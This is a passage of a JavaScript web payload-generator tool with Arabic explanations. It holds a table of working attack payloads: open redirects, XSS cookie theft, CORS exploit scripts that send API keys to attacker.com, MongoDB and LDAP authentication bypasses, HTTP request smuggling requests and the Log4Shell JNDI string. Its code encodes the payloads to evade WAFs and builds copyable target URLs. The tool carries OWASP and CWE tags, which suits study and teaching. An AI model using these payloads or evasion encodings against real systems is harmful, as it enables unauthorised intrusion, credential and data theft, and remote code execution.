    }
  },
  open_redirect: {
    phishing: {
      url_param: {
        code: "http://attacker.com",
        breakout: "",
        template: "Header('Location: ' . $_GET['redirect']);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 302 Found\nLocation: http://attacker.com",
        owasp: "A01:2021 - Broken Access Control",
        cwe: "CWE-601",
        capec: "CAPEC-185",
        stars: "★★☆☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Unvalidated redirect parameter"],
        pipeline: [
          { title: "Redirect Request", desc: "Target URL visited." },
          { title: "Header Location", desc: "Server issues 302 Location." }
        ],
        desc: "تحويل مباشر إلى موقع المخترق (Phishing Domain) لسرقة بيانات الدخول أو تضليل المستخدم."
      },
      path_based: {
        code: "//attacker.com",
        breakout: "//",
        template: "if (startsWith($_GET['url'], '/')) { header('Location: '.$_GET['url']); }",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 302 Found\nLocation: //attacker.com",
        owasp: "A01:2021 - Broken Access Control",
        cwe: "CWE-601",
        capec: "CAPEC-185",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Flawed slash validation"],
        pipeline: [
          { title: "Protocol-Relative", desc: "// maps to http(s)://" }
        ],
        desc: "استخدام مسار يعتمد على البروتوكول (Protocol-Relative URL) لتخطي فلاتر الروابط الضعيفة."
      }
    },
    js_exec: {
      url_param: {
        code: "javascript:alert(document.cookie)",
        breakout: "javascript:",
        template: "<a href=\"[USER_INPUT]\">Click here to continue</a>",
        simulatedType: "dialog",
        simulatedVal: "session=9f8234a1bc89...",
        owasp: "A03:2021 - Injection / XSS",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["href attribute injection without scheme validation"],
        pipeline: [
          { title: "Link Render", desc: "<a href=javascript:...> rendered." }
        ],
        desc: "تنفيذ جافاسكريبت ضار مستغلاً وضع رابط التوجيه داخل سمة `href` دون تطهير."
      },
      path_based: {
        code: "javascript:alert(document.cookie)",
        breakout: "javascript:",
        template: "<a href=\"[USER_INPUT]\">Back to home</a>",
        simulatedType: "dialog",
        simulatedVal: "session=9f8234a1bc89...",
        owasp: "A03:2021 - Injection / XSS",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["href attribute context"],
        pipeline: [
          { title: "Link Render", desc: "javascript: executed on click." }
        ],
        desc: "تنفيذ أكواد جافاسكريبت عبر بروتوكول javascript الوهمي."
      }
    }
  },
  cors: {
    steal_api: {
      null_origin: {
        code: "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script>\n  var req = new XMLHttpRequest();\n  req.onload = req.onerror = function() {\n    fetch('http://attacker.com/log?data=' + btoa(req.responseText));\n  };\n  req.open('GET', 'https://vulnerable.com/api/keys', true);\n  req.withCredentials = true;\n  req.send();\n</script>\"></iframe>",
        breakout: "null",
        template: "Access-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true",
        simulatedType: "network",
        simulatedVal: "Origin: null -> Response 200 OK\nExfiltrated API Key: ak_live_991823abf...",
        owasp: "A05:2021 - Security Misconfiguration",
        cwe: "CWE-942",
        capec: "CAPEC-63",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Server reflects Origin: null with Credentials: true"],
        pipeline: [
          { title: "Sandboxed iframe", desc: "Forces Origin: null header." },
          { title: "CORS Auth", desc: "Credentials attached to request." }
        ],
        desc: "استغلال ثقة السيرفر بمصدر `null` عبر إطار iframe مقيد وسرقة البيانات الحساسة."
      },
      arb_origin: {
        code: "<script>\n  var req = new XMLHttpRequest();\n  req.onload = req.onerror = function() {\n    fetch('http://attacker.com/log?data=' + btoa(req.responseText));\n  };\n  req.open('GET', 'https://vulnerable.com/api/keys', true);\n  req.withCredentials = true;\n  req.send();\n</script>",
        breakout: "withCredentials",
        template: "Access-Control-Allow-Origin: https://attacker.com\nAccess-Control-Allow-Credentials: true",
        simulatedType: "network",
        simulatedVal: "Origin: https://attacker.com -> Response 200 OK\nExfiltrated API Key: ak_live_991823abf...",
        owasp: "A05:2021 - Security Misconfiguration",
        cwe: "CWE-942",
        capec: "CAPEC-63",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Server trusts arbitrary origins with credentials"],
        pipeline: [
          { title: "Arbitrary Origin", desc: "Origin header reflected." }
        ],
        desc: "استغلال ثقة السيرفر بأي مصدر عشوائي لسرقة بيانات المستخدم."
      }
    }
  },
  nosqli: {
    auth_bypass: {
      json_body: {
        code: "{\"username\": \"admin\", \"password\": {\"$ne\": null}}",
        breakout: "$ne",
        template: "db.users.find([USER_INPUT]);",
        simulatedType: "db_success",
        simulatedVal: "MongoDB Query Returned 1 Record: { _id: ObjectId('...'), username: 'admin', role: 'root' }",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-943",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["MongoDB / Express body parser accepts JSON objects"],
        pipeline: [
          { title: "JSON Injection", desc: "$ne operator injected into query." }
        ],
        desc: "استغلال عامل الـ `$ne` (Not Equal) في قواعد بيانات MongoDB لتخطي كلمة المرور والتسجيل كآدمن."
      },
      url_query: {
        code: "[$ne]=null",
        breakout: "$ne",
        template: "db.users.find({ username: req.query.username, password: req.query.password });",
        simulatedType: "db_success",
        simulatedVal: "MongoDB Query Returned 1 Record: { _id: ObjectId('...'), username: 'admin' }",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-943",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Query parser parses brackets into object"],
        pipeline: [
          { title: "URL Query Injection", desc: "$ne object constructed." }
        ],
        desc: "حقن معامل الـ `$ne` عبر رابط الاستعلام (URL Query) لتخطي فحص كلمة المرور."
      }
    },
    regex_extract: {
      json_body: {
        code: "{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}}",
        breakout: "$regex",
        template: "db.users.find([USER_INPUT]);",
        simulatedType: "db_success",
        simulatedVal: "Character Match Found! Password starts with 'a'.",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-943",
        capec: "CAPEC-66",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Regex queries allowed in MongoDB driver"],
        pipeline: [
          { title: "Regex Bruteforce", desc: "^a tested against password field." }
        ],
        desc: "استخراج الحرف الأول من كلمة المرور حرفاً بحرف باستخدام التعبير النمطي `$regex`."
      },
      url_query: {
        code: "[$regex]=^a",
        breakout: "$regex",
        template: "db.users.find({ username: 'admin', password: req.query.password });",
        simulatedType: "db_success",
        simulatedVal: "Character Match Found! Password starts with 'a'.",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-943",
        capec: "CAPEC-66",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Query parser object conversion"],
        pipeline: [
          { title: "Regex Bruteforce", desc: "^a tested." }
        ],
        desc: "استخراج كلمة المرور عبر الـ URL باستخدام التعبير النمطي."
      }
    }
  },
  ldap: {
    auth_bypass: {
      filter_string: {
        code: "*)(uid=*))(|(uid=*",
        breakout: "*",
        template: "(&(uid=[USER_INPUT])(userPassword=secret))",
        simulatedType: "db_success",
        simulatedVal: "LDAP Auth Success: Matched Object DN: cn=Administrator,ou=users,dc=corp",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-90",
        capec: "CAPEC-136",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["LDAP filter string concatenation"],
        pipeline: [
          { title: "LDAP Breakout", desc: "* terminates filter boolean logic." }
        ],
        desc: "استغلال الرمز النجمي `*` والـ OR Operator `|` في استعلامات LDAP لتجنيب فحص كلمة المرور والتسجيل بحساب المدير."
      }
    },
    attr_extract: {
      filter_string: {
        code: "*)(sn=*))(|(uid=*",
        breakout: "*",
        template: "(&(uid=[USER_INPUT])(objectClass=user))",
        simulatedType: "db_table",
        simulatedVal: "[ {dn: 'cn=Admin'}, {mail: 'admin@corp.local'}, {telephoneNumber: '+123456'} ]",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-90",
        capec: "CAPEC-136",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["LDAP filter string context"],
        pipeline: [
          { title: "LDAP Attribute Query", desc: "sn=* returns all user objects." }
        ],
        desc: "حقن فلتر LDAP لاستخراج السمات المخفية مثل أرقام الهواتف والبريد الإلكتروني."
      }
    }
  },
  smuggling: {
    req_smuggle: {
      cl_te: {
        code: "POST / HTTP/1.1\r\nHost: vulnerable.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
        breakout: "Transfer-Encoding",
        template: "Front-End Proxy (Content-Length) -> Back-End Server (Transfer-Encoding)",
        simulatedType: "http_res",
        simulatedVal: "Smuggled Byte 'G' Prepended to Next User's Request!\nNext user receives 404 Not Found (GGET / HTTP/1.1).",
        owasp: "A05:2021 - Security Misconfiguration",
        cwe: "CWE-444",
        capec: "CAPEC-273",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["HTTP/1.1 Desynchronization flaw between proxy and backend server"],
        pipeline: [
          { title: "Front-end Processing", desc: "Proxy reads 13 bytes via Content-Length." },
          { title: "Back-end Processing", desc: "Backend stops at 0 chunk (Transfer-Encoding)." },
          { title: "Smuggled Buffer", desc: "Byte 'G' remains unparsed in backend socket buffer." },
          { title: "Victim Poisoning", desc: "Byte 'G' prepends to next victim's HTTP request." }
        ],
        desc: "هجوم CL.TE: يعتمد السيرفر الأمامي على Content-Length بينما يعتمد الخلفي على Transfer-Encoding. يسمح هذا بتثبيت طلب هجومي يلتحق بطلب المستخدم التالي!"
      },
      te_cl: {
        code: "POST / HTTP/1.1\r\nHost: vulnerable.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
        breakout: "Content-Length",
        template: "Front-End Proxy (Transfer-Encoding) -> Back-End Server (Content-Length)",
        simulatedType: "http_res",
        simulatedVal: "Smuggled Request Processed by Back-End Server!",
        owasp: "A05:2021 - Security Misconfiguration",
        cwe: "CWE-444",
        capec: "CAPEC-273",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["HTTP/1.1 Desynchronization"],
        pipeline: [
          { title: "Desync Processing", desc: "Request smuggled." }
        ],
        desc: "هجوم TE.CL: يعتمد الأمامي على Chunked والخلفي على Length، مما يسمح بتهريب طلب كامل داخل الاتصال."
      }
    }
  },
  log4j: {
    jndi_rce: {
      header_user_agent: {
        code: "${jndi:ldap://attacker.com/a}",
        breakout: "${jndi:",
        template: "logger.info(\"User-Agent: \" + [USER_INPUT]);",
        simulatedType: "terminal",
        simulatedVal: "JNDI Lookup Triggered! Connecting to ldap://attacker.com/a\nExecuting Remote Java Class: Exploit.class (RCE Success)",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-917 & CWE-502",
        capec: "CAPEC-242",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Vulnerable Apache Log4j2 library (v2.0-beta9 to 2.14.1)"],
        pipeline: [
          { title: "Logger Input", desc: "${jndi:...} string logged." },
          { title: "JNDI Lookup", desc: "Log4j evaluates lookup expression." },
          { title: "LDAP Query", desc: "Connects to attacker LDAP server." },
          { title: "Remote RCE", desc: "Downloads and executes Java bytecode." }
        ],
        desc: "ثغرة Log4Shell الخالدة. تقوم مكتبة Log4j بتقييم السلسلة `${jndi:...}` وإجراء اتصال LDAP خارجي لتنفيذ كود جافا خبيث فوراً."
      },
      input_param: {
        code: "${jndi:ldap://attacker.com/a}",
        breakout: "${jndi:",
        template: "logger.error(\"Search Query Failed: \" + [USER_INPUT]);",
        simulatedType: "terminal",
        simulatedVal: "JNDI Lookup Triggered! Connecting to ldap://attacker.com/a\nExecuting Remote Java Class: Exploit.class (RCE Success)",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-917 & CWE-502",
        capec: "CAPEC-242",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Log4j2 unpatched engine"],
        pipeline: [
          { title: "JNDI Lookup", desc: "Remote RCE executed." }
        ],
        desc: "حقن سلسلة JNDI داخل بارامتر البحث أو أي حقل مدخلات يتم تسجيله بالـ Log."
      }
    }
  }
};

document.addEventListener("DOMContentLoaded", () => {
  const vulnClassEl = document.getElementById("vuln-class");
  const contextEl = document.getElementById("vuln-context");
  const actionEl = document.getElementById("vuln-action");
  const filterEl = document.getElementById("vuln-filter");
  const searchInput = document.getElementById("search-input");
  const btnGenerate = document.getElementById("btn-generate");
  const btnCopy = document.getElementById("btn-copy");
  const btnFav = document.getElementById("btn-fav");
  const btnCopyUrl = document.getElementById("btn-copy-url");
  const targetBaseUrlInput = document.getElementById("target-base-url");
  
  const outputCode = document.getElementById("output-code");
  const simCodeBefore = document.getElementById("sim-code-before");
  const simCodeAfter = document.getElementById("sim-code-after");
  const domPreviewContainer = document.getElementById("dom-preview-container");
  const wafBadgeContainer = document.getElementById("waf-badge-container");
  const wafAnalysisText = document.getElementById("waf-analysis-text");
  const outputExplanation = document.getElementById("output-explanation");

  const pipelineContainer = document.getElementById("pipeline-container");
  const academicMetaContainer = document.getElementById("academic-meta-container");
  const browserMatrixContainer = document.getElementById("browser-matrix-container");
  const attackReqContainer = document.getElementById("attack-req-container");
  const diagTerminal = document.getElementById("diag-terminal");

  let currentGeneratedPayload = "";

  function populateDropdowns() {
    const vClass = vulnClassEl.value;
    const data = VulnData[vClass];
    if (!data) return;

    contextEl.innerHTML = "";
    data.contexts.forEach(ctx => {
      const opt = document.createElement("option");
      opt.value = ctx.id;
      opt.textContent = ctx.label;
      contextEl.appendChild(opt);
    });

    actionEl.innerHTML = "";
    data.actions.forEach(act => {
      const opt = document.createElement("option");
      opt.value = act.id;
      opt.textContent = act.label;
      actionEl.appendChild(opt);
    });
  }

  vulnClassEl.addEventListener("change", populateDropdowns);
  populateDropdowns();

  searchInput.addEventListener("input", (e) => {
    const query = e.target.value.toLowerCase().trim();
    Array.from(vulnClassEl.options).forEach(opt => {
      const text = opt.textContent.toLowerCase();
      const val = opt.value.toLowerCase();
      opt.style.display = (text.includes(query) || val.includes(query)) ? "" : "none";
    });
  });

  function applyFilter(code, filterType) {
    if (filterType === "urlencode") return encodeURIComponent(code);
    if (filterType === "doubleurlencode") return encodeURIComponent(encodeURIComponent(code));
    if (filterType === "base64") return btoa(unescape(encodeURIComponent(code)));
    if (filterType === "htmlentity") return code.replace(/[\u00A0-\u9999<>\&]/g, i => '&#'+i.charCodeAt(0)+';');
    if (filterType === "hex") return code.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join('');
    if (filterType === "casevar") return code.split('').map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join('');
    return code;
  }

  function escapeHtml(str) {
    return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
  }

  // SYNTAX HIGHLIGHTING ENGINE
  function highlightSyntax(codeStr) {
    let html = escapeHtml(codeStr);
    // Highlight HTML tags
    html = html.replace(/&lt;(\/?[a-zA-Z0-9]+)/g, '&lt;<span class="syn-tag">$1</span>');
    // Highlight Attributes
    html = html.replace(/([a-zA-Z\-]+)=(&quot;|&#039;|")/g, '<span class="syn-attr">$1</span>=$2');
    // Highlight Keywords
    html = html.replace(/\b(alert|fetch|SELECT|UNION|FROM|WHERE|include|system|exec|AND|OR|WAITFOR|DELAY|php:\/\/|jndi:ldap)\b/gi, '<span class="syn-kw">$1</span>');
    return html;
  }

  function renderInjectionSimulation(template, finalCode, breakout) {
    const beforeStr = template.replace("[USER_INPUT]", "USER_INPUT");
    simCodeBefore.innerHTML = highlightSyntax(beforeStr).replace("USER_INPUT", "<span style='color: var(--accent-cyan); font-weight: bold;'>[USER_INPUT]</span>");

    let afterHtml = escapeHtml(template);
    const escapedCode = escapeHtml(finalCode);
    
    if (breakout && escapedCode.includes(escapeHtml(breakout))) {
      const escapedBreakout = escapeHtml(breakout);
      const highlightedCode = escapedCode.replace(escapedBreakout, `<span class="syn-breakout">${escapedBreakout}</span><span style="color:#86efac;">`) + `</span>`;
      afterHtml = afterHtml.replace("[USER_INPUT]", highlightedCode);
    } else {
      afterHtml = afterHtml.replace("[USER_INPUT]", `<span style="color:#86efac;">${escapedCode}</span>`);
    }
    
    simCodeAfter.innerHTML = highlightSyntax(afterHtml);
  }

  function renderPipeline(pipeline) {
    if (!pipeline || pipeline.length === 0) {
      pipelineContainer.innerHTML = `<div style="color:var(--text-muted); padding:10px;">Pipeline flowchart loading...</div>`;
      return;
    }
    pipelineContainer.innerHTML = pipeline.map((step, idx) => `
      <div class="pipeline-step">
        <span class="pipeline-step-num">Step 0${idx + 1}</span>
        <div class="pipeline-step-title">${step.title}</div>
        <div class="pipeline-step-desc">${step.desc}</div>
      </div>
    `).join('');
  }

  function renderAcademicMeta(payloadData) {
    academicMetaContainer.innerHTML = `
      <div class="meta-badge-item"><i class="bx bx-shield"></i> <strong>OWASP:</strong> ${payloadData.owasp || 'A03:2021-Injection'}</div>
      <div class="meta-badge-item"><i class="bx bx-bug"></i> <strong>CWE:</strong> ${payloadData.cwe || 'CWE-79'}</div>
      <div class="meta-badge-item"><i class="bx bx-layer"></i> <strong>CAPEC:</strong> ${payloadData.capec || 'CAPEC-63'}</div>
      <div class="meta-badge-item"><i class="bx bx-star"></i> <strong>Complexity:</strong> <span class="star-rating">${payloadData.stars || '★★★☆☆'}</span></div>
    `;
  }

  function renderBrowserMatrix(payloadData) {
    const b = payloadData.browsers || { chrome: true, firefox: true, safari: true, edge: true };
    browserMatrixContainer.innerHTML = `
      <div class="browser-chip"><i class="bx bxl-chrome" style="color:#38bdf8;"></i> Chrome ${b.chrome ? '✅' : '⚠️'}</div>
      <div class="browser-chip"><i class="bx bxl-firefox" style="color:#f97316;"></i> Firefox ${b.firefox ? '✅' : '⚠️'}</div>
      <div class="browser-chip"><i class="bx bxl-apple" style="color:#cbd5e1;"></i> Safari ${b.safari ? '✅' : '⚠️'}</div>
      <div class="browser-chip"><i class="bx bxl-edge" style="color:#38bdf8;"></i> Edge ${b.edge ? '✅' : '⚠️'}</div>
    `;

    const reqs = payloadData.prereqs || ["Standard Web Context"];
    attackReqContainer.innerHTML = `<strong>Prerequisites:</strong> ` + reqs.map(r => `<span style="background:rgba(255,255,255,0.05); padding:2px 8px; border-radius:4px; margin-right:6px;">${r}</span>`).join('');
  }

  function renderDOMPreview(payloadData) {
    domPreviewContainer.innerHTML = "";
    const type = payloadData.simulatedType;
    const val = payloadData.simulatedVal;

    if (type === "dialog") {
      domPreviewContainer.innerHTML = `
        <div class="simulated-dialog">
          <div style="font-size:0.8rem; color:#94a3b8; margin-bottom:8px;"><i class="bx bx-error-circle"></i> localhost says</div>
          <div style="font-family:var(--font-mono); font-size:0.95rem; color:#38bdf8; background:#0f172a; padding:8px 12px; border-radius:4px; margin-bottom:12px;">${escapeHtml(val)}</div>
          <button style="background:#38bdf8; color:#0f172a; border:none; padding:4px 15px; border-radius:4px; font-weight:bold; font-size:0.8rem; cursor:pointer;" onclick="this.parentElement.style.opacity='0.5'">OK</button>
        </div>
      `;
    } else {
      domPreviewContainer.innerHTML = `
        <div style="width:100%; font-family:var(--font-mono); font-size:0.82rem; color:#4ade80;">
          <div style="color:#94a3b8; margin-bottom:5px;"><i class="bx bx-terminal"></i> Live Output / Execution Result:</div>
          <div style="background:#020617; padding:12px; border-radius:6px; border:1px solid rgba(255,255,255,0.1); white-space:pre-wrap; color:#cbd5e1; direction:ltr; text-align:left;">${escapeHtml(val)}</div>
        </div>
      `;
    }
  }

  function simulateWAF(payloadCode, filterType) {
    const isRawNaive = (filterType === 'none') && (
      payloadCode.includes('<script>') || payloadCode.includes("' OR '1'='1") || payloadCode.includes('/etc/passwd')
    );

    if (isRawNaive) {
      wafBadgeContainer.innerHTML = `<span class="waf-status-badge waf-badge-blocked"><i class="bx bx-x-circle"></i> WAF Flagged / Blocked</span>`;
      wafAnalysisText.innerHTML = `<strong style="color:#f87171;">تنبيه جدار الحماية:</strong> الكود يحتوي على كلمات محظورة عارية بديهية. اختر تشفيراً أو سياقاً بديلاً للتخطي.`;
    } else {
      wafBadgeContainer.innerHTML = `<span class="waf-status-badge waf-badge-bypassed"><i class="bx bx-check-circle"></i> WAF Bypassed / Clean</span>`;
      wafAnalysisText.innerHTML = `<strong style="color:#4ade80;">تم تخطي الجدار الناري بنجاح:</strong> الـ Payload يتجنب الكلمات المحظورة البديهية ويدمج تقنيات تشفير وسياقات ملتفة.`;
    }
  }

  function getFilterExplanation(filterType) {
    if (filterType === "urlencode") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (URL Encode):</strong> تم تشفير الكود بتشفير URL لتخطي أنظمة الـ WAF البسيطة.";
    if (filterType === "doubleurlencode") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Double URL Encode):</strong> تم تشفير الكود مرتين لتخطي الأنظمة التي تفك التشفير مرتين.";
    if (filterType === "base64") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Base64):</strong> تم تشفير الكود بـ Base64 لتخطي الفلاتر عند إرسال بيانات JSON أو API.";
    if (filterType === "htmlentity") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (HTML Entity):</strong> تحويل الرموز لكيانات HTML لتخطي فلاتر الـ Regex.";
    if (filterType === "hex") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Hex Encoding):</strong> تحويل الأحرف لقيم سداسية عشرية لخداع الفلاتر.";
    if (filterType === "casevar") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Case Variation):</strong> التلاعب بحالة الأحرف (كبير/صغير) لتخطي الفلاتر الحساسة للحالة.";
    return "";
  }

  // ANIMATED DIAGNOSTIC TERMINAL LOGIC
  function runDiagnosticAnalysis(vClass, vContext, callback) {
    diagTerminal.style.display = "block";
    diagTerminal.innerHTML = `<div>[+] Initializing Context Diagnostic Analyzer...</div>`;
    
    setTimeout(() => {
      diagTerminal.innerHTML += `<div>[+] Target Context Detected: <span style="color:#fff;">${vContext}</span></div>`;
    }, 120);

    setTimeout(() => {
      diagTerminal.innerHTML += `<div>[+] Analyzing AST DOM tree & WAF Ruleset...</div>`;
    }, 250);

    setTimeout(() => {
      diagTerminal.innerHTML += `<div style="color:#4ade80;">[SUCCESS] Exploit optimized & rendered!</div>`;
      setTimeout(() => {
        diagTerminal.style.display = "none";
        callback();
      }, 300);
    }, 400);
  }

  function generateAndSimulate() {
    const vClass = vulnClassEl.value;
    const vContext = contextEl.value;
    const vAction = actionEl.value;
    const vFilter = filterEl.value;

    runDiagnosticAnalysis(vClass, vContext, () => {
      let payloadData = null;
      try {
        payloadData = PayloadTemplates[vClass][vAction][vContext];
      } catch(e) {}

      if (payloadData) {
        const finalCode = applyFilter(payloadData.code, vFilter);
        currentGeneratedPayload = finalCode;
        
        outputCode.innerHTML = highlightSyntax(finalCode);
        renderInjectionSimulation(payloadData.template, finalCode, payloadData.breakout);
        renderPipeline(payloadData.pipeline);
        renderAcademicMeta(payloadData);
        renderBrowserMatrix(payloadData);
        renderDOMPreview(payloadData);
        simulateWAF(payloadData.code, vFilter);
        outputExplanation.innerHTML = payloadData.desc + getFilterExplanation(vFilter);

        targetBaseUrlInput.value = `https://target-vulnerable.com/search?q=${encodeURIComponent(finalCode)}`;
        saveToHistory(finalCode, vClass, vAction);
        checkFavoriteStatus();
      } else {
        outputCode.textContent = "خطأ: لم يتم العثور على هذا الـ Payload.";
        outputExplanation.textContent = "الرجاء اختيار مجموعة أخرى من الخصائص.";
      }
    });
  }

  btnGenerate.addEventListener("click", generateAndSimulate);

  // LOCALSTORAGE FAVORITES & HISTORY
  function getFavorites() { return JSON.parse(localStorage.getItem("bba_fav_payloads") || "[]"); }
  function getHistory() { return JSON.parse(localStorage.getItem("bba_hist_payloads") || "[]"); }

  function checkFavoriteStatus() {
    const favs = getFavorites();
    if (favs.includes(currentGeneratedPayload)) {
      btnFav.classList.add("active-fav");
      btnFav.innerHTML = `<i class='bx bxs-star'></i> Favorited`;
    } else {
      btnFav.classList.remove("active-fav");
      btnFav.innerHTML = `<i class='bx bx-star'></i> Favorite`;
    }
  }

  btnFav.addEventListener("click", () => {
    if (!currentGeneratedPayload) return;
    let favs = getFavorites();
    if (favs.includes(currentGeneratedPayload)) {
      favs = favs.filter(p => p !== currentGeneratedPayload);
    } else {
      favs.push(currentGeneratedPayload);
    }
    localStorage.setItem("bba_fav_payloads", JSON.stringify(favs));
    checkFavoriteStatus();
  });

  function saveToHistory(code, vClass, vAction) {
    let hist = getHistory();
    hist = hist.filter(h => h.code !== code);
    hist.unshift({ code, vClass, vAction, time: new Date().toLocaleTimeString() });
    if (hist.length > 10) hist.pop();
    localStorage.setItem("bba_hist_payloads", JSON.stringify(hist));
  }

  btnCopy.addEventListener("click", () => {
    if (currentGeneratedPayload) {
      navigator.clipboard.writeText(currentGeneratedPayload).then(() => {
        btnCopy.innerHTML = "<i class='bx bx-check'></i> Copied!";
        setTimeout(() => btnCopy.innerHTML = "<i class='bx bx-copy'></i> Copy", 2000);
      });
    }
  });

  btnCopyUrl.addEventListener("click", () => {
    navigator.clipboard.writeText(targetBaseUrlInput.value).then(() => {
      btnCopyUrl.innerHTML = "<i class='bx bx-check'></i> Copied!";
      setTimeout(() => btnCopyUrl.innerHTML = "<i class='bx bx-copy'></i> Copy URL", 2000);
    });
  });

  // MODALS ENGINE
  const modalToolbox = document.getElementById("modal-toolbox");
  const modalFav = document.getElementById("modal-fav");
  const modalHistory = document.getElementById("modal-history");

  window.closeModals = () => {
    if (modalToolbox) modalToolbox.style.display = "none";
    if (modalFav) modalFav.style.display = "none";
    if (modalHistory) modalHistory.style.display = "none";
  };

  [modalToolbox, modalFav, modalHistory].forEach(modal => {
    if (modal) {
      modal.addEventListener("click", (e) => {
        if (e.target === modal) window.closeModals();
      });
    }
  });

  const btnTb = document.getElementById("btn-modal-toolbox");
  if (btnTb) {
    btnTb.addEventListener("click", (e) => {
      e.preventDefault();
      window.closeModals();
      if (modalToolbox) modalToolbox.style.display = "flex";
    });
  }

  const btnFavM = document.getElementById("btn-modal-fav");
  if (btnFavM) {
    btnFavM.addEventListener("click", (e) => {
      e.preventDefault();
      window.closeModals();
      if (modalFav) modalFav.style.display = "flex";
      renderFavModal();
    });
  }

  const btnHistM = document.getElementById("btn-modal-history");
  if (btnHistM) {
    btnHistM.addEventListener("click", (e) => {
      e.preventDefault();
      window.closeModals();
      if (modalHistory) modalHistory.style.display = "flex";
      renderHistoryModal();
    });
  }

  function renderFavModal() {
    const favs = getFavorites();
    const container = document.getElementById("fav-list-container");
    if (!container) return;
    if (favs.length === 0) {
      container.innerHTML = `<div style="text-align:center; color:var(--text-muted); padding:20px;">No favorites saved yet. Click ⭐ on any payload!</div>`;
      return;
    }
    container.innerHTML = favs.map(code => `
      <div class="list-item-row">
        <span class="list-item-code">${escapeHtml(code)}</span>
        <button class="btn-action-sm" onclick="navigator.clipboard.writeText('${escapeHtml(code).replace(/'/g, "\\'")}'); alert('Copied!')"><i class="bx bx-copy"></i></button>
      </div>
    `).join('');
  }

  function renderHistoryModal() {
    const hist = getHistory();
    const container = document.getElementById("history-list-container");
    if (!container) return;
    if (hist.length === 0) {
      container.innerHTML = `<div style="text-align:center; color:var(--text-muted); padding:20px;">No generation history yet.</div>`;
      return;
    }
    container.innerHTML = hist.map(item => `
      <div class="list-item-row">
        <div>
          <div style="font-size:0.75rem; color:var(--accent-cyan);">${item.vClass.toUpperCase()} - ${item.vAction} <span style="color:#64748b;">(${item.time})</span></div>
          <span class="list-item-code">${escapeHtml(item.code)}</span>
        </div>
        <button class="btn-action-sm" onclick="navigator.clipboard.writeText('${escapeHtml(item.code).replace(/'/g, "\\'")}'); alert('Copied!')"><i class="bx bx-copy"></i></button>
      </div>
    `).join('');
  }

  const tbInput = document.getElementById("toolbox-input");
  const tbB64 = document.getElementById("toolbox-b64");
  const tbUrl = document.getElementById("toolbox-url");
  const tbHex = document.getElementById("toolbox-hex");
  const tbHtml = document.getElementById("toolbox-html");

  if (tbInput) {
    tbInput.addEventListener("input", () => {
      const val = tbInput.value;
      if (!val) {
        tbB64.value = tbUrl.value = tbHex.value = tbHtml.value = "";
        return;
      }
      try { tbB64.value = btoa(unescape(encodeURIComponent(val))); } catch(e) { tbB64.value = "Error"; }
      tbUrl.value = encodeURIComponent(val);
      tbHex.value = val.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join('');
      tbHtml.value = val.replace(/[\u00A0-\u9999<>\&]/g, i => '&#'+i.charCodeAt(0)+';');
    });
  }

  const btnExp = document.getElementById("btn-export-all");
  if (btnExp) {
    btnExp.addEventListener("click", (e) => {
      e.preventDefault();
      const data = {
        currentPayload: currentGeneratedPayload,
        favorites: getFavorites(),
        history: getHistory()
      };
      const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "bba_payload_masterclass.json";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
